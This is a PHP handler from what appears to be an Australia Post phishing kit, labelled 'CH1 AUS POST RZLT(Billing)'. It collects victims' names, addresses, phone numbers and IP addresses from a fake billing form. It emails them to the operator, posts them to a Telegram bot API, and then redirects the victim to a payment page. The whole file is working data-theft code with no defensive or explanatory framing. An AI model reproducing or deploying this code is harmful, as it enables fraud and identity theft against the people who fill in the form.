<?php

error_reporting(0);
session_start();
include "../../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

	$_SESSION["name"]= $_POST['name'];

$hostname = gethostbyaddr($ip);
$message = "[========== 🇦🇺 CH1 AUS POST RZLT(Billing) 🇦🇺 ===========]\r\n";
$message .= "|Full Name       : ".$_POST['name']." ".$_POST['lastname']."\r\n";
$message .= "|Adress      	 : ".$_POST['address']."\r\n";
$message .= "|City            : ".$_POST['City']."\r\n";
$message .= "|State       	 : ".$_POST['state']."\r\n";
$message .= "|zip   	         : ".$_POST['Zip']."\r\n";
$message .= "|Phone           : ".$_POST['phone']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_POST['name'].") AUS POST RZLT $ip";
$headers = "From: [CH1_AUS POST **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
echo"<script>location.replace('../payment.php');</script>";


?>